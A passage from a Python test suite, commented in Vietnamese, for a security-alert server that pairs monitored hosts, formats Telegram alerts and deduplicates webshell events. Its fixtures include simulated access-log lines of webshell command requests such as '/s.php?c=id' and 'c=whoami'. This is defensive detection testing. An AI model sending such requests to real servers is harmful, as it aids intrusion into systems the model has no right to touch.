            for i in range(3)))
        groups, total, _cut = pv.groups_from_jsonl(path, 8)
        assert total == 3, name
        assert len(groups) == 1, name
        assert groups[0]["file"] == "/var/log/nginx/access.log", name
        assert groups[0]["raw"] == rec["raw"], name


# ---------------------------------------------------------------------------
# NGHIỆP VỤ: xác nhận ghép nối thay cho alert TEST
# ---------------------------------------------------------------------------
def test_pairing_notice_on_every_install(env):
    """Mỗi lần cài (kể cả re-pair máy mới của dự án đã linked) đều có 1 tin."""
    client, cfg, tg = env
    chat = 8020
    for i in range(3):
        _register_chatid(client, "du-an", chat, device=f"may-{i}")
    notifies = [t for _, t in tg.sent if "GHÉP NỐI THÀNH CÔNG" in t]
    assert len(notifies) == 3
    for i, t in enumerate(notifies):
        assert f"may-{i}" in t          # nói đúng máy vừa cài


def test_pairing_notice_shows_monitor_version(env):
    """Tin ghép nối hiển thị version monitor — cài mới và cài đè đều thấy."""
    import html as _html
    import re

    client, cfg, tg = env

    # cài mới
    _register_chatid(client, "du-an", 8030, device="may-1",
                     monitor_version="1.4.6")
    # cài đè bản update trên máy thứ hai
    _register_chatid(client, "du-an", 8030, device="may-2",
                     monitor_version="1.5.0")

    def plain(t):
        return _html.unescape(re.sub(r"</?[a-zA-Z][^>]*>", "", t))

    t1, t2 = plain(tg.sent[0][1]), plain(tg.sent[1][1])
    assert "php2Shell-monitor: 1.4.6" in t1
    assert "php2Shell-monitor: 1.5.0" in t2
    assert "Dự án: du-an" in t1 and "Thiết bị: may-1" in t1
    assert "Thiết bị: may-2" in t2


def test_pairing_notice_is_exactly_three_facts(env):
    """Đúng 3 dòng thông tin, không lời dẫn, không hướng dẫn."""
    import html as _html
    import re

    client, cfg, tg = env
    _register_chatid(client, "du-an", 8031, device="may-x", monitor_version="1.4.6")
    text = _html.unescape(re.sub(r"</?[a-zA-Z][^>]*>", "", tg.sent[0][1]))
    body = [ln for ln in text.split("\n") if ln.strip() and "GHÉP NỐI" not in ln]
    assert len(body) == 3, body
    assert body[0].startswith("📦") and "Dự án" in body[0]
    assert body[1].startswith("🏷") and "Thiết bị" in body[1]
    assert body[2].startswith("🛠") and "php2Shell-monitor" in body[2]


def test_pairing_notice_is_not_an_alert(env):
    """Tin ghép nối KHÔNG được mang khung cảnh báo an ninh."""
    client, cfg, tg = env
    _register_chatid(client, "du-an", 8021, device="may-x")
    text = tg.sent[0][1]
    assert "GHÉP NỐI THÀNH CÔNG" in text
    # không có khung alert: không "CENTRAL SECURITY ALERT", không "Sự kiện",
    # không "Event logs" — người trực ca không thể nhầm với sự cố
    for bad in ("CENTRAL SECURITY ALERT", "Sự kiện:", "Event logs",
                "Phát hiện nghi vấn khai thác"):
        assert bad not in text, bad
    # và không nằm trong bảng alerts
    with db.connect(cfg.database_path) as conn:
        assert conn.execute("SELECT COUNT(*) AS n FROM alerts").fetchone()["n"] == 0


def test_no_test_alert_anywhere(env):
    """TEST-001 không còn sinh alert, kể cả khi client cũ gửi lên."""
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "lan_ip": "10.0.0.7", "user": "root",
                          "os": "Ubuntu", "env": "Host",
                          "alerts": [{"ts_utc": "2026-11-03T02:25:00Z",
                                      "rule_id": "TEST-001", "severity": "INFO",
                                      "tier": "TEST",
                                      "message": "Alert thử đường truyền"}]})
    assert r.status_code == 200
    body = r.json()
    # không raw thật -> không gửi (bất biến "alert phải có bằng chứng")
    assert tg.sent == []
    assert body["messages"] == 0


# ---------------------------------------------------------------------------
# ĐỔI NƠI NHẬN ALERT (group <-> chat riêng)
# ---------------------------------------------------------------------------
def test_same_device_new_chat_moves_project(env):
    """Cùng máy, đổi chat: CHUYỂN row, không tạo dự án thứ hai.

    Đây là thao tác `--force --chatid <chat mới>`. Trước đây sinh row thứ hai
    cùng tên: /list hiện dự án hai lần, lịch sử alert tách đôi, và agent cũ còn
    sống vẫn gửi alert về chat cũ nên người dùng đổi chat xong vẫn thấy alert
    ở group.
    """
    client, cfg, tg = env
    r1 = _register_chatid(client, "localgaba", -1001111111111, device="may-1")
    k1 = client.get(f"/api/v1/pairing-status?code={r1['pair_ref']}").json()["api_key"]
    assert client.get("/api/v1/whoami", headers={"X-API-Key": k1}).json()["chat_id"] == "-1001111111111"

    r2 = _register_chatid(client, "localgaba", 1244302311, device="may-1")
    k2 = client.get(f"/api/v1/pairing-status?code={r2['pair_ref']}").json()["api_key"]

    with db.connect(cfg.database_path) as conn:
        rows = conn.execute("SELECT id, telegram_chat_id FROM projects"
                            " WHERE project_name='localgaba'").fetchall()
    assert len(rows) == 1, [dict(r) for r in rows]
    assert rows[0]["telegram_chat_id"] == "1244302311"
    # key mới trỏ đúng chat mới
    assert client.get("/api/v1/whoami", headers={"X-API-Key": k2}).json()["chat_id"] == "1244302311"


def test_same_name_different_device_stays_separate(env):
    """Hai khách trùng tên dự án + khác máy: KHÔNG gộp (tránh lộ alert chéo)."""
    client, cfg, tg = env
    _register_chatid(client, "web", -1002222222222, device="khachA-host")
    _register_chatid(client, "web", -1003333333333, device="khachB-host")
    with db.connect(cfg.database_path) as conn:
        rows = conn.execute("SELECT telegram_chat_id FROM projects"
                            " WHERE project_name='web'").fetchall()
    assert len(rows) == 2
    assert {r["telegram_chat_id"] for r in rows} == {"-1002222222222", "-1003333333333"}


def test_alert_follows_chat_after_move(env):
    """Sau khi chuyển chat, alert đi tới chat MỚI, không tới chat cũ."""
    client, cfg, tg = env
    r1 = _register_chatid(client, "localgaba", -1001111111111, device="may-1")
    client.get(f"/api/v1/pairing-status?code={r1['pair_ref']}")   # tiêu thụ code
    r2 = _register_chatid(client, "localgaba", 1244302311, device="may-1")
    key = client.get(f"/api/v1/pairing-status?code={r2['pair_ref']}").json()["api_key"]

    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "may-1", "alerts": [_alert(batch="20261103T050000Z")]})
    alerts_sent = [(c, t) for c, t in tg.sent if "CENTRAL SECURITY ALERT" in t]
    assert len(alerts_sent) == 1
    assert alerts_sent[0][0] == "1244302311"      # chat mới, không phải group cũ


def test_history_follows_project_when_chat_moves(env):
    """Lịch sử alert đi theo dự án: đổi chat không làm mất lịch sử."""
    client, cfg, tg = env
    r1 = _register_chatid(client, "localgaba", -1001111111111, device="may-1")
    key1 = client.get(f"/api/v1/pairing-status?code={r1['pair_ref']}").json()["api_key"]
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key1},
                json={"host": "may-1", "alerts": [_alert(batch="20261103T051000Z")]})
    with db.connect(cfg.database_path) as conn:
        before = conn.execute("SELECT COUNT(*) AS n FROM alerts").fetchone()["n"]
    assert before == 1

    r2 = _register_chatid(client, "localgaba", 1244302311, device="may-1")
    client.get(f"/api/v1/pairing-status?code={r2['pair_ref']}")
    with db.connect(cfg.database_path) as conn:
        after = conn.execute("SELECT COUNT(*) AS n FROM alerts").fetchone()["n"]
        pid = conn.execute("SELECT id FROM projects WHERE project_name='localgaba'").fetchone()["id"]
        owner = conn.execute("SELECT project_id FROM alerts").fetchone()["project_id"]
    assert after == before == 1          # không mất, không nhân đôi
    assert owner == pid                  # vẫn thuộc dự án đó


# =====================================================================
# Khung tin 1.1.1 — spec operator chốt:
#   * "Cảnh báo" thay "Sự kiện"
#   * header chỉ nêu SỐ EVENT THẬT server nhận (dedup, chống hit ảo)
#   * tối đa 5 path, tối đa 3 event/path (tổng tối đa 15)
#   * mỗi path một dòng "Path <i>N</i>:", event trong <blockquote>,
#     timeline trong dòng log in đậm
# =====================================================================

def _many(paths=7, per_path=4):
    """<paths> path, mỗi path <per_path> event KHÁC nhau (khác line)."""
    prev = []
    for pi in range(paths):
        for ei in range(per_path):
            prev.append({
                "rule_id": "P2S-050", "hits": 1, "severity": "HIGH", "impact": "",
                "source": "access_log",
                "file": f"/var/log/nginx/site{pi}.access.log",
                "line": 100 + ei, "lines": 1,
                "raw": (f'10.0.0.{pi} - - [05/Nov/2026:04:1{ei}:00 +0000] '
                        f'"GET /p{pi}/e{ei}.php?x=1 HTTP/1.1" 200 5'),
            })
    return prev


def _base(hits=100):
    return {"user": "root", "os": "Ubuntu", "env": "Host", "hostname": "h",
            "lan_ip": "10.0.0.2", "ts_utc": "2026-11-05T04:12:00Z",
            "severity": "HIGH", "hits": hits}


def test_spec_label_is_canh_bao():
    """"Cảnh báo" thay "Sự kiện"; không được quay lại nhãn cũ."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert
    msg = format_alert("p", dict(_base(), preview=_many(1, 1)), ZoneInfo("UTC"))
    assert "⚠️ <b>Cảnh báo:</b>" in msg
    assert "Sự kiện" not in msg


def test_spec_header_is_only_event_count():
    """Header = "Event logs (x events)"; không còn "N nhóm"."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert
    msg = format_alert("p", dict(_base(2465), preview=_many(2, 2),
                                 preview_meta="2465|8"), ZoneInfo("UTC"))
    assert "🧩 <b>Event logs (2465 events)</b>" in msg
    head = msg.split("Event logs (")[1].split(")")[0]
    assert head == "2465 events"
    assert "nhóm" not in msg


def test_spec_max_5_paths_and_3_events_per_path():
    """Quá nhiều nội dung: tối đa 5 path, tối đa 3 event mỗi path."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert
    prev = _many(7, 4)          # 7 path x 4 event
    msg = format_alert("p", dict(_base(), preview=prev), ZoneInfo("UTC"))
    paths = [ln for ln in msg.split("\n") if ln.startswith("<b>Path:</b>")]
    assert len(paths) == 5, paths
    # mỗi blockquote tối đa 3 dòng event
    for blk in msg.split("<blockquote>")[1:]:
        body = blk.split("</blockquote>", 1)[0]
        assert len([x for x in body.split("\n") if x.strip()]) <= 3, body
    # phần bị ẩn phải được nêu, không im lặng
    tail = [ln for ln in msg.split("\n") if ln.startswith("<i>…")]
    assert tail and "path" in tail[0]


def test_spec_event_total_is_deduped_not_rule_sum():
    """Số event = số event THẬT: một dòng bị đẩy lên 2 lần chỉ tính 1."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert
    one = {"raw": "203.0.113.9 - - [05/Nov/2026:04:11:02 +0000] \"GET /a HTTP/1.1\" 200 5",
           "source": "access_log", "file": "/var/log/nginx/access.log", "line": 7}
    ev = [dict(one), dict(one),                       # trùng hoàn toàn -> 1
          dict(one, line=8),                           # dòng khác -> event khác
          dict(one, line=8, raw="other content")]      # nội dung khác -> event khác
    msg = format_alert("p", dict(_base(999), evidence=ev,
                                 preview=[dict(one, hits=1, impact="", severity="HIGH")]),
                       ZoneInfo("UTC"))
    assert "Event logs (3 events)" in msg, msg


def test_spec_timeline_is_bold_and_only_timeline():
    """Chỉ phần timeline in đậm; IP/URI không bị in đậm."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert, mark_timeline
    raw = '203.0.113.9 - - [05/Nov/2026:04:11:02 +0000] "GET /x HTTP/1.1" 200 5'
    assert mark_timeline(raw) == (
        '203.0.113.9 - - <b>[05/Nov/2026:04:11:02 +0000]</b> '
        '"GET /x HTTP/1.1" 200 5')
    # ISO của journald/docker (kèm nano + offset)
    iso = "2026-11-04T22:33:11.118859+07:00 egghead kernel: segfault"
    assert "<b>2026-11-04T22:33:11.118859+07:00</b>" in mark_timeline(iso)
    # syslog cổ điển
    assert "<b>Nov  5 07:43:31</b>" in mark_timeline("Nov  5 07:43:31 host sshd[1]: x")
    # không có timestamp -> không thêm tag nào
    assert mark_timeline("webroot webshell pattern: /var/www/s.php") == \
        "webroot webshell pattern: /var/www/s.php"


def test_spec_timeline_escape_order_never_breaks_entity():
    """Escape SAU khi tách: raw chứa & < > vẫn ra HTML hợp lệ."""
    from app.telegram import mark_timeline
    out = mark_timeline('1.2.3.4 - - [05/Nov/2026:04:11:02 +0000] "GET /a?x=1&y=<b> HTTP/1.1"')
    assert "&amp;" in out and "&lt;b&gt;" in out
    # &lt; không được bị cắt giữa chừng bởi offset timeline
    assert "<b>[05/Nov/2026:04:11:02 +0000]</b>" in out


def test_spec_path_has_no_number_and_must_be_absolute():
    """Nhãn "Path" KHÔNG đánh số, và chỉ in khi giá trị là đường dẫn thật.

    Sự cố thật: kernel plugin gửi "journalctl -k" vào field `file`, tin Telegram
    hiện "Path 1: journalctl -k" — người trực ca không biết mở file nào để tra.
    """
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert, is_valid_path

    assert is_valid_path("/var/log/nginx/access.log")
    assert is_valid_path("/proc/1234/cmdline")
    assert is_valid_path("/var/log/journal/982346377fc04554a06eed0b5bfc8f8c/system.journal")
    assert is_valid_path("container:drill-dwva:/var/log/apache2/access.log")
    assert is_valid_path("docker:web:33ae17b45385:/var/lib/docker/containers/33ae17b45385/33ae17b45385-json.log")
    # Dạng 1.4.2 CÓ cid12 thì DỊCH được thành đường dẫn thật -> hợp lệ.
    assert is_valid_path("docker:web:33ae17b45385")
    assert is_valid_path("container:drill-dwva:33ae17b45385")
    assert is_valid_path("journalctl -k")
    # Không suy ra được đường dẫn thì KHÔNG hợp lệ (không đội lốt nhãn Path).
    for bad in ("", "kernel", "docker", "docker:web", "container:name", "relative/x.log"):
        assert not is_valid_path(bad), bad

    def alert_with(raw, file):
        return {"ts_utc": "2026-11-05T04:12:00Z", "severity": "HIGH", "hits": 1,
                "user": "root", "os": "Ubuntu", "env": "Host", "hostname": "h",
                "lan_ip": "10.0.0.2",
                "preview": [{"rule_id": "P2S-011", "hits": 1, "impact": "",
                             "source": "kernel", "file": file, "line": 1, "lines": 1,
                             "raw": raw}]}

    msg = format_alert("p", alert_with("Nov  5 07:43:31 h kernel: segfault at 0",
                                       "/var/log/journal/ab12/system.journal"),
                       ZoneInfo("UTC"))
    assert "<b>Path:</b> <code>/var/log/journal/ab12/system.journal</code>" in msg
    assert "Path 1" not in msg and "<i>1</i>" not in msg

    # monitor 1.4.2 gửi "journalctl -k" -> dịch thành đường dẫn journal thật
    legacy_msg = format_alert("p", alert_with("Nov  5 07:43:31 h kernel: segfault at 0",
                                              "journalctl -k"), ZoneInfo("UTC"))
    assert "<b>Path:</b> <code>/var/log/journal/*/system.journal</code>" in legacy_msg
    assert "journalctl -k" not in legacy_msg

    # giá trị KHÔNG dịch được thì không đội lốt Path
    bad_msg = format_alert("p", alert_with("Nov  5 07:43:31 h kernel: segfault at 0",
                                           "kernel"), ZoneInfo("UTC"))
    assert "<b>Path:</b>" not in bad_msg
    assert "<i>Nguồn: kernel</i>" in bad_msg


def test_containers_survive_defer_and_resend(env):
    """Alert bị HOÃN rồi gửi bù vẫn phải giữ dòng 🐳 Container.

    Lỗi thật (phát hiện khi test tương thích với monitor 1.4.2): `containers`
    có trong payload nhưng KHÔNG có cột trong bảng alerts, nên mọi tin gửi bù
    và mọi `POST /alerts/{id}/resend` mất dòng Container trong khi đường ingest
    trực tiếp thì còn — sai đúng ở những alert quan trọng nhất.
    """
    import gzip

    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(batch="20261105T110000Z"),
                 lan_ip="10.3.64.128",
                 containers=["drill-dwva (33ae17b45385)"])
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "lan_ip": "10.3.64.128", "alerts": [alert]})
    aid = r.json()["alerts"][0]["alert_id"]

    # chưa có evidence -> hoãn, chưa gửi
    assert not tg.sent

    body = b"".join(json.dumps(x, ensure_ascii=False).encode() + b"\n"
                    for x in _old_monitor_records(2))
    client.post("/api/v1/ingest-evidence",
                headers={"X-API-Key": key, "X-Batch-Id": "20261105T110000Z",
                         "X-Hostname": "h", "X-Lan-Ip": "10.3.64.128",
                         "X-User": "root", "Content-Type": "application/gzip"},
                content=gzip.compress(body))

    assert len(tg.sent) == 1, tg.sent
    assert "🐳 <b>Container:</b>" in tg.sent[0][1]
    assert "drill-dwva (33ae17b45385)" in tg.sent[0][1]

    # gửi lại cũng phải còn
    tg.sent.clear()
    r = client.post(f"/api/v1/alerts/{aid}/resend",
                    headers={"X-Admin-Token": "test-admin"})
    assert r.status_code == 200, r.text
    assert "🐳 <b>Container:</b>" in tg.sent[-1][1]


def test_containers_accepts_json_string_from_db():
    """Cột DB là TEXT JSON: format_alert phải hiểu cả list lẫn chuỗi.

    Lỗi thật (alert 174): cột `alerts.containers` chứa '["drill-dwva"]', lặp qua
    chuỗi ra từng ký tự -> tin hiện "🐳 Container: [, ", d, r, i".
    """
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    base = {"ts_utc": "2026-11-05T10:34:00Z", "severity": "CRITICAL", "hits": 1,
            "user": "root", "os": "Ubuntu", "env": "Host", "hostname": "h",
            "lan_ip": "10.0.0.2",
            "preview": [{"rule_id": "P2S-056", "hits": 1, "impact": "rce",
                         "source": "webroot", "file": "/var/www/html/s.php",
                         "line": 0, "lines": 0, "raw": "webshell"}]}
    for val in (["drill-dwva"], '["drill-dwva"]', '["a","b"]', ["a", "b"]):
        msg = format_alert("p", dict(base, containers=val), ZoneInfo("UTC"))
        assert "🐳 <b>Container:</b> <code>drill-dwva</code>" in msg or \
               "🐳 <b>Container:</b> <code>a, b</code>" in msg, (val, msg)
        assert '[, "' not in msg, "containers bị lặp theo ký tự"


# =====================================================================
# 1.4.2 compatibility: path resolution, container cid12, chặn alert lặp
# =====================================================================

def test_legacy_142_paths_resolve_to_real_files():
    """`file` của 1.4.2 phải dịch được thành đường dẫn thật, không bị bỏ."""
    from app import legacy

    assert legacy.resolve_file("docker:web:aaabbbcccddd") == \
        "/var/lib/docker/containers/aaabbbcccddd*/aaabbbcccddd*-json.log"
    assert legacy.resolve_file("container:web:aaabbbcccddd") == \
        "/var/lib/docker/containers/aaabbbcccddd*/aaabbbcccddd*-json.log"
    assert legacy.resolve_file("journalctl -k") == "/var/log/journal/*/system.journal"
    assert legacy.resolve_file("journalctl --since x -u nginx") == \
        "/var/log/journal/*/system.journal"
    # dạng mới: giữ nguyên đường dẫn tuyệt đối (idempotent).
    for keep in ("/var/log/nginx/access.log", "/proc/1234/cmdline",
                 "container:web:/var/log/nginx/access.log"):
        assert legacy.resolve_file(keep) == keep, keep
    # docker dạng mới: bỏ tiền tố `docker:<tên>:<cid12>:` và chỉ in đường dẫn —
    # tên container đã có ở dòng 🐳 riêng nên lặp lại là nhiễu.
    assert legacy.resolve_file(
        "docker:web:aaabbbcccddd:/var/lib/docker/containers/"
        "aaabbbcccddd/aaabbbcccddd-json.log") == \
        "/var/lib/docker/containers/aaabbbcccddd/aaabbbcccddd-json.log"
    # không suy ra được thì rỗng — KHÔNG bịa
    for empty in ("", None, "kernel", "docker", "docker:web"):
        assert legacy.resolve_file(empty) == "", empty


def test_legacy_142_containers_get_cid12():
    """`containers[]` thiếu cid12 được bổ từ chính field `file` của hit."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    alert = {"ts_utc": "2026-11-06T03:00:00Z", "severity": "HIGH", "hits": 1,
             "user": "root", "os": "Ubuntu", "env": "Host", "hostname": "h",
             "lan_ip": "10.0.0.2",
             "containers": ["drill-dwva"],
             "preview": [{"rule_id": "P2S-050", "hits": 1, "impact": "",
                          "source": "access_log",
                          "file": "docker:drill-dwva:33ae17b45385",
                          "line": 7, "lines": 1, "raw": "x"}]}
    msg = format_alert("p", alert, ZoneInfo("UTC"))
    assert "🐳 <b>Container:</b> <code>drill-dwva (33ae17b45385)</code>" in msg

    # đã có cid12 thì giữ nguyên, không nhân đôi
    again = format_alert("p", dict(alert, containers=["drill-dwva (33ae17b45385)"]),
                         ZoneInfo("UTC"))
    assert "🐳 <b>Container:</b> <code>drill-dwva (33ae17b45385)</code>" in again
    # đúng MỘT dòng Container, và nó chỉ nêu cid một lần (dòng Path có glob riêng)
    container_lines = [ln for ln in again.split("\n") if ln.startswith("🐳")]
    assert len(container_lines) == 1
    assert container_lines[0].count("33ae17b45385") == 1, container_lines[0]

    # tên trần mà không có hit nào mang cid -> để nguyên, không bịa
    lone = format_alert("p", dict(alert, containers=["redacted"], preview=[]),
                        ZoneInfo("UTC"))
    if "🐳" in lone:
        assert "redacted" in lone and "()" not in lone


def _alert_batch(batch, raw, line=7, file="/var/log/nginx/access.log"):
    return {"batch_id": batch, "ts_utc": "2026-11-06T03:00:00Z",
            "severity": "HIGH", "hits": 1, "rule_id": "P2S-050",
            "preview": [{"rule_id": "P2S-050", "hits": 1, "severity": "HIGH",
                         "impact": "", "source": "access_log",
                         "file": file, "line": line, "lines": 1, "raw": raw}],
            "preview_meta": "1|1"}


def test_repeated_event_is_not_alerts_again(env):
    """Event đã báo thì batch sau KHÔNG được gửi lại (chống spam của 1.4.2).

    Monitor <= 1.4.2 không dedup ở nguồn: một webshell nằm yên trên đĩa sinh ra
    đúng một nhóm event giống hệt nhau mỗi 5 phút. Đo trên lab: 48 tin cho một
    shell. Server là chốt chặn duy nhất.
    """
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    same = ('203.0.113.9 - - [06/Nov/2026:03:00:00 +0000] '
            '"GET /s.php?c=id HTTP/1.1" 200 5')

    r1 = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                     json={"host": "h", "alerts": [_alert_batch("20261106T030000Z", same)]})
    assert r1.json()["alerts"][0]["status"] == "stored"
    assert len(tg.sent) == 1

    # cùng event, batch mới 5 phút sau -> KHÔNG gửi
    r2 = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                     json={"host": "h", "alerts": [_alert_batch("20261106T030500Z", same)]})
    body = r2.json()["alerts"][0]
    assert body["status"] == "suppressed", body
    assert body["duplicate_events"] == 1
    assert len(tg.sent) == 1, "tin thứ hai cho cùng event"

    # dòng KHÁC (khác số dòng, khác nội dung) vẫn là event mới -> gửi
    r3 = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                     json={"host": "h", "alerts": [
                         _alert_batch("20261106T031000Z",
                                      same.replace("c=id", "c=whoami"), line=99)]})
    assert r3.json()["alerts"][0]["status"] == "stored"
    assert len(tg.sent) == 2


def test_suppressed_alert_is_not_resent_by_cleanup(env):
    """Alert bị chặn vì trùng phải là messages=2, không phải 0.

    messages=0 nghĩa là "đang chờ gửi bù": cleanup loop sẽ nhặt lại và gửi đúng
    cái vừa bị chặn, biến dedup thành vô nghĩa.
    """
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    same = '203.0.113.9 - - [06/Nov/2026:03:00:00 +0000] "GET /s.php?c=id HTTP/1.1" 200 5'
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "alerts": [_alert_batch("20261106T040000Z", same)]})
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "alerts": [_alert_batch("20261106T040500Z", same)]})
    aid = r.json()["alerts"][0]["alert_id"]
    con = sqlite3.connect(cfg.database_path)
    try:
        row = con.execute("SELECT messages FROM alerts WHERE id = ?", (aid,)).fetchone()
    finally:
        con.close()
    assert row[0] == 2, f"messages={row[0]} sẽ bị cleanup gửi bù"


def test_dedup_keeps_new_events_in_a_mixed_batch(env):
    """Batch có cả event cũ và mới: gửi, chỉ hiện event mới, số đếm khớp."""
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    old = '203.0.113.9 - - [06/Nov/2026:03:00:00 +0000] "GET /s.php?c=id HTTP/1.1" 200 5'
    new = '203.0.113.9 - - [06/Nov/2026:03:05:00 +0000] "GET /s.php?c=uname HTTP/1.1" 200 7'

    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "alerts": [_alert_batch("20261106T050000Z", old)]})
    mixed = _alert_batch("20261106T050500Z", new)
    mixed["preview"].append({"rule_id": "P2S-050", "hits": 1, "severity": "HIGH",
                             "impact": "", "source": "access_log",
                             "file": "/var/log/nginx/access.log", "line": 7,
                             "lines": 1, "raw": old})
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "alerts": [mixed]})

    assert len(tg.sent) == 2
    last = tg.sent[-1][1]
    assert "Event logs (1 event)" in last, last
    assert "c=uname" in last
    assert "c=id" not in last, "event cũ vẫn hiện trên tin mới"


def test_dedup_window_expiry_allows_realert(env):
    """Hết cửa sổ dedup thì event cũ được báo lại (sự cố lặp lại vẫn đáng thấy)."""
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    same = '203.0.113.9 - - [06/Nov/2026:03:00:00 +0000] "GET /s.php?c=id HTTP/1.1" 200 5'
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "alerts": [_alert_batch("20261106T060000Z", same)]})
    assert len(tg.sent) == 1
    # đẩy mốc sent_at ra ngoài cửa sổ
    con = sqlite3.connect(cfg.database_path)
    with con:
        con.execute("UPDATE reported_events SET sent_at = '2020-01-01T00:00:00Z'")
    con.close()
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "alerts": [_alert_batch("20261106T060500Z", same)]})
    assert r.json()["alerts"][0]["status"] == "stored"
    assert len(tg.sent) == 2
